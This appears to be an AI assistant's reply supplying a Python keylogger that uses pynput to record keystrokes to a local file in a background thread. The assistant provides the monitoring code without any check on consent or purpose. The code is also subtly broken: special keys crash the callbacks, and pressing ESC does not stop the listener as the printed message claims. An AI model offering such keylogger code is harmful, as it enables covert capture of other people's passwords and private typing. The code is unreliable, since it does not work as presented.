Here is an implementation that follows your requirements using the pynput library for key logging:

```python
import sys
from pynput import keyboard
import threading

log_file = 'keylogs.txt'

def write_to_file(data):
    with open(log_file, 'a') as f:
        f.write(data)

def keylogger():
    print('Keylogger started...\nPress ESC to stop.\n')
    
    # Define the special keys and their representations
    special_keys = {keyboard.Key.space: '[SPACE]', keyboard.Key.enter: '[ENTER]'}
    
    with keyboard.Listener(on_press=lambda e: write_to_file(f'{e.char if e.char else special_keys[e.key]}'), 
                           on_release=lambda x: write_to_file('[KEY RELEASED]') if x == keyboard.Key.esc else None) as listener:
        listener.join()

# Starting the key logger in a separate thread to avoid blocking
thread = threading.Thread(target=keylogger, daemon=True)        
thread.start()
thread.join()  # Wait for keylogger to finish before exiting
```

